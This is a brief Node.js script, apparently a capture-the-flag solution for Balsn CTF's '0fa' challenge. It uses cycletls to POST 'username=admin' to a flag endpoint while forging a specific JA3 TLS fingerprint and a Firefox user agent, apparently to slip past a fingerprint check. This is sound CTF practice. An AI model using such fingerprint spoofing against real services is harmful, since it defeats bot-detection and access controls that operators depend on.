const initCycleTLS = require('cycletls');

(async () => {
  const cycleTLS = await initCycleTLS();

  const response = await cycleTLS('https://localhost:8787/flag.php', {
  //const response = await cycleTLS('https://0fa.balsnctf.com:8787/flag.php', {
    body: 'username=admin',
    ja3: '771,4866-4865-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0',
    headers: {"Content-Type": "application/x-www-form-urlencoded",},
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0'
  }, 'post');

  console.log(response);
  cycleTLS.exit();
})();